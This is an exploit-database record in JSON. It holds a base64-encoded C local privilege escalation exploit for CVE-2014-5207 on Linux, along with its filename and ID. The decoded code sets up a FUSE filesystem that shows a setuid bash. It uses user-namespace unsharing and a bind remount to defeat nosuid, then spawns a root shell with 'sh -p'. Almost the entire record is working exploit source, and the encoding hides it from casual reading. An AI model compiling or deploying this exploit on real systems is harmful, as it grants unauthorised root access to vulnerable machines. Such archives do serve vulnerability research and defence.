{
    "source": "exploit-database", 
    "exploit": "LyoNCiBGVVNFLWJhc2VkIGV4cGxvaXQgZm9yIENWRS0yMDE0LTUyMDcNCiBDb3B5cmlnaHQgKGMpIDIwMTQgQW5keSBMdXRvbWlyc2tpDQoNCiBCYXNlZCBvbiBjb2RlIHRoYXQgaXM6DQogQ29weXJpZ2h0IChDKSAyMDAxLTIwMDcgIE1pa2xvcyBTemVyZWRpIDxtaWtsb3NAc3plcmVkaS5odT4NCg0KIFRoaXMgcHJvZ3JhbSBjYW4gYmUgZGlzdHJpYnV0ZWQgdW5kZXIgdGhlIHRlcm1zIG9mIHRoZSBHTlUgR1BMLg0KIFNlZSB0aGUgZmlsZSBDT1BZSU5HLg0KDQogZ2NjIC1XYWxsIGZ1c2Vfc3VpZC5jIGBwa2ctY29uZmlnIGZ1c2UgLS1jZmxhZ3MgLS1saWJzYCAtbyBmdXNlX3N1aWQNCiBta2RpciB0ZXN0DQogLi9mdXNlX3N1aWQgdGVzdA0KDQogVGhpcyBpc24ndCBhIHdvcmsgb2YgYXJ0OiBpdCBkb2Vzbid0IGNsZWFuIHVwIGFmdGVyIGl0c2VsZiB2ZXJ5IHdlbGwuDQoqLw0KDQojZGVmaW5lIF9HTlVfU09VUkNFDQojZGVmaW5lIEZVU0VfVVNFX1ZFUlNJT04gMjYNCg0KI2luY2x1ZGUgPGZ1c2UuaD4NCiNpbmNsdWRlIDxzdGRpby5oPg0KI2luY2x1ZGUgPHN0cmluZy5oPg0KI2luY2x1ZGUgPGVycm5vLmg+DQojaW5jbHVkZSA8ZmNudGwuaD4NCiNpbmNsdWRlIDxlcnIuaD4NCiNpbmNsdWRlIDxzY2hlZC5oPg0KI2luY2x1ZGUgPHN0ZGxpYi5oPg0KI2luY2x1ZGUgPHN5cy90eXBlcy5oPg0KI2luY2x1ZGUgPHN5cy93YWl0Lmg+DQojaW5jbHVkZSA8c3lzL21vdW50Lmg+DQojaW5jbHVkZSA8dW5pc3RkLmg+DQoNCnN0YXRpYyBjb25zdCBjaGFyICpzaF9wYXRoID0gIi9zaCI7DQpzdGF0aWMgaW50IHNoX2ZkOw0Kc3RhdGljIGxvZmZfdCBzaF9zaXplOw0KDQpzdGF0aWMgaW50IGhlbGxvX2dldGF0dHIoY29uc3QgY2hhciAqcGF0aCwgc3RydWN0IHN0YXQgKnN0YnVmKQ0Kew0KICAgaW50IHJlcyA9IDA7DQoNCiAgIG1lbXNldChzdGJ1ZiwgMCwgc2l6ZW9mKHN0cnVjdCBzdGF0KSk7DQogICBpZiAoc3RyY21wKHBhdGgsICIvIikgPT0gMCkgew0KICAgICAgIHN0YnVmLT5zdF9tb2RlID0gU19JRkRJUiB8IDA3NTU7DQogICAgICAgc3RidWYtPnN0X25saW5rID0gMjsNCiAgIH0gZWxzZSBpZiAoc3RyY21wKHBhdGgsIHNoX3BhdGgpID09IDApIHsNCiAgICAgICBzdGJ1Zi0+c3RfbW9kZSA9IFNfSUZSRUcgfCAwNDc1NTsNCiAgICAgICBzdGJ1Zi0+c3RfbmxpbmsgPSAxOw0KICAgICAgIHN0YnVmLT5zdF9zaXplID0gc2hfc2l6ZTsNCiAgIH0gZWxzZQ0KICAgICAgIHJlcyA9IC1FTk9FTlQ7DQoNCiAgIHJldHVybiByZXM7DQp9DQoNCnN0YXRpYyBpbnQgaGVsbG9fcmVhZGRpcihjb25zdCBjaGFyICpwYXRoLCB2b2lkICpidWYsIGZ1c2VfZmlsbF9kaXJfdCBmaWxsZXIsDQogICAgICAgICAgICBvZmZfdCBvZmZzZXQsIHN0cnVjdCBmdXNlX2ZpbGVfaW5mbyAqZmkpDQp7DQogICAodm9pZCkgb2Zmc2V0Ow0KICAgKHZvaWQpIGZpOw0KDQogICBpZiAoc3RyY21wKHBhdGgsICIvIikgIT0gMCkNCiAgICAgICByZXR1cm4gLUVOT0VOVDsNCg0KICAgZmlsbGVyKGJ1ZiwgIi4iLCBOVUxMLCAwKTsNCiAgIGZpbGxlcihidWYsICIuLiIsIE5VTEwsIDApOw0KICAgZmlsbGVyKGJ1Ziwgc2hfcGF0aCArIDEsIE5VTEwsIDApOw0KDQogICByZXR1cm4gMDsNCn0NCg0Kc3RhdGljIGludCBoZWxsb19vcGVuKGNvbnN0IGNoYXIgKnBhdGgsIHN0cnVjdCBmdXNlX2ZpbGVfaW5mbyAqZmkpDQp7DQogICBpZiAoc3RyY21wKHBhdGgsIHNoX3BhdGgpICE9IDApDQogICAgICAgcmV0dXJuIC1FTk9FTlQ7DQoNCiAgIGlmICgoZmktPmZsYWdzICYgMykgIT0gT19SRE9OTFkpDQogICAgICAgcmV0dXJuIC1FQUNDRVM7DQoNCiAgIHJldHVybiAwOw0KfQ0KDQpzdGF0aWMgaW50IGhlbGxvX3JlYWQoY29uc3QgY2hhciAqcGF0aCwgY2hhciAqYnVmLCBzaXplX3Qgc2l6ZSwgb2ZmX3Qgb2Zmc2V0LA0KICAgICAgICAgICAgIHN0cnVjdCBmdXNlX2ZpbGVfaW5mbyAqZmkpDQp7DQogICAodm9pZCkgZmk7DQogICBpZiAoc3RyY21wKHBhdGgsIHNoX3BhdGgpICE9IDApDQogICAgICAgcmV0dXJuIC1FTk9FTlQ7DQoNCiAgIHJldHVybiBwcmVhZChzaF9mZCwgYnVmLCBzaXplLCBvZmZzZXQpOw0KfQ0KDQpzdGF0aWMgc3RydWN0IGZ1c2Vfb3BlcmF0aW9ucyBoZWxsb19vcGVyID0gew0KICAgLmdldGF0dHIgICAgPSBoZWxsb19nZXRhdHRyLA0KICAgLnJlYWRkaXIgICAgPSBoZWxsb19yZWFkZGlyLA0KICAgLm9wZW4gICAgICAgID0gaGVsbG9fb3BlbiwNCiAgIC5yZWFkICAgICAgICA9IGhlbGxvX3JlYWQsDQp9Ow0KDQpzdGF0aWMgaW50IGV2aWxmZCA9IC0xOw0KDQpzdGF0aWMgaW50IGNoaWxkMih2b2lkICptbnRfdm9pZCkNCnsNCiAgIGNvbnN0IGNoYXIgKm1vdW50cG9pbnQgPSBtbnRfdm9pZDsNCiAgIGludCBmZDI7DQoNCiAgIGlmICh1bnNoYXJlKENMT05FX05FV1VTRVIgfCBDTE9ORV9ORVdOUykgIT0gMCkNCiAgICAgICBlcnIoMSwgInVuc2hhcmUiKTsNCg0KICAgaWYgKG1vdW50KG1vdW50cG9pbnQsIG1vdW50cG9pbnQsIE5VTEwsIE1TX1JFTU9VTlQgfCBNU19CSU5ELCBOVUxMKSA8IDApDQogICAgICAgZXJyKDEsICJtb3VudCIpOw0KDQogICBmZDIgPSBvcGVuKG1vdW50cG9pbnQsIE9fUkRPTkxZIHwgT19ESVJFQ1RPUlkpOw0KICAgaWYgKGZkMiA9PSAtMSkNCiAgICAgICBlcnIoMSwgIm9wZW4iKTsNCg0KICAgaWYgKGR1cDMoZmQyLCBldmlsZmQsIE9fQ0xPRVhFQykgPT0gLTEpDQogICAgICAgZXJyKDEsICJkdXAzIik7DQogICBjbG9zZShmZDIpOw0KDQogICBwcmludGYoIk1vdW50IGhhY2tlcnkgc2VlbXMgdG8gaGF2ZSB3b3JrZWQuXG4iKTsNCg0KICAgZXhpdCgwKTsNCn0NCg0Kc3RhdGljIGludCBjaGlsZDEoY29uc3QgY2hhciAqbW91bnRwb2ludCkNCnsNCiAgIGNoYXIgY2hpbGQyc3RhY2tbMjA0OF07DQogICBjaGFyIGV2aWxfcGF0aFsxMDI0XTsNCg0KICAgZXZpbGZkID0gZHVwKDApOw0KICAgaWYgKGV2aWxmZCA9PSAtMSkNCiAgICAgICBlcnIoMSwgImR1cCIpOw0KDQogICBpZiAoY2xvbmUoY2hpbGQyLCBjaGlsZDJzdGFjaywNCiAgICAgICAgIENMT05FX0ZJTEVTIHwgQ0xPTkVfVkZPUkssDQogICAgICAgICAodm9pZCAqKW1vdW50cG9pbnQpID09IC0xKQ0KICAgICAgIGVycigxLCAiY2xvbmUiKTsNCg0KICAgcHJpbnRmKCJIZXJlIGdvZXMuLi5cbiIpOw0KDQogICBzcHJpbnRmKGV2aWxfcGF0aCwgIi9wcm9jL3NlbGYvZmQvJWQvc2giLCBldmlsZmQpOw0KICAgZXhlY2woZXZpbF9wYXRoLCAic2giLCAiLXAiLCBOVUxMKTsNCiAgIHBlcnJvcihldmlsX3BhdGgpOw0KICAgcmV0dXJuIDE7DQp9DQoNCnN0YXRpYyBpbnQgZnVzZV9tYWluX3N1aWQoaW50IGFyZ2MsIGNoYXIgKmFyZ3ZbXSwNCiAgICAgICAgICAgICBjb25zdCBzdHJ1Y3QgZnVzZV9vcGVyYXRpb25zICpvcCwNCiAgICAgICAgICAgICB2b2lkICp1c2VyX2RhdGEpDQp7DQogICBzdHJ1Y3QgZnVzZSAqZnVzZTsNCiAgIGNoYXIgKm1vdW50cG9pbnQ7DQogICBpbnQgbXVsdGl0aHJlYWRlZDsNCiAgIGludCByZXM7DQoNCiAgIGlmIChhcmdjICE9IDIpIHsNCiAgICAgICBwcmludGYoIlVzYWdlOiBmdXNlX3N1aWQgPG1vdW50cG9pbnQ+XG4iKTsNCiAgICAgICByZXR1cm4gLUVJTlZBTDsNCiAgIH0NCg0KICAgY2hhciAqYXJnc1tdID0geyJmdXNlX3N1aWQiLCAiLWYiLCAiLS0iLCBhcmd2WzFdLCBOVUxMfTsNCg0KICAgZnVzZSA9IGZ1c2Vfc2V0dXAoc2l6ZW9mKGFyZ3MpL3NpemVvZihhcmdzWzBdKSAtIDEsIGFyZ3MsDQogICAgICAgICAgICAgb3AsIHNpemVvZigqb3ApLCAmbW91bnRwb2ludCwNCiAgICAgICAgICAgICAmbXVsdGl0aHJlYWRlZCwgdXNlcl9kYXRhKTsNCiAgIGlmIChmdXNlID09IE5VTEwpDQogICAgICAgcmV0dXJuIDE7DQoNCiAgIHByaW50ZigiRlVTRSBpbml0aWFsaXplZC4gIFRpbWUgdG8gaGF2ZSBzb21lIGZ1bi4uLlxuIik7DQogICBwcmludGYoIldhcm5pbmc6IHRoaXMgZXhwbG9pdCBoYW5ncyBvbiBleGl0LiAgSGl0IEN0cmwtQyB3aGVuIGRvbmUuXG4iKTsNCiAgIGlmIChmb3JrKCkgPT0gMCkNCiAgICAgICBfZXhpdChjaGlsZDEobW91bnRwb2ludCkpOw0KDQogICBpZiAobXVsdGl0aHJlYWRlZCkNCiAgICAgICByZXMgPSBmdXNlX2xvb3BfbXQoZnVzZSk7DQogICBlbHNlDQogICAgICAgcmVzID0gZnVzZV9sb29wKGZ1c2UpOw0KDQogICBmdXNlX3RlYXJkb3duKGZ1c2UsIG1vdW50cG9pbnQpOw0KICAgaWYgKHJlcyA9PSAtMSkNCiAgICAgICByZXR1cm4gMTsNCg0KICAgcmV0dXJuIDA7DQp9DQoNCmludCBtYWluKGludCBhcmdjLCBjaGFyICphcmd2W10pDQp7DQogICBzaF9mZCA9IG9wZW4oIi9iaW4vYmFzaCIsIE9fUkRPTkxZKTsNCiAgIGlmIChzaF9mZCA9PSAtMSkNCiAgICAgICBlcnIoMSwgInNoIik7DQogICBzaF9zaXplID0gbHNlZWsoc2hfZmQsIDAsIFNFRUtfRU5EKTsNCiAgIHJldHVybiBmdXNlX21haW5fc3VpZChhcmdjLCBhcmd2LCAmaGVsbG9fb3BlciwgTlVMTCk7DQp9", 
    "filename": "platforms/linux/local/34923.c", 
    "id": "34923", 
    "cves": [
        "CVE-2014-5207"
    ]
}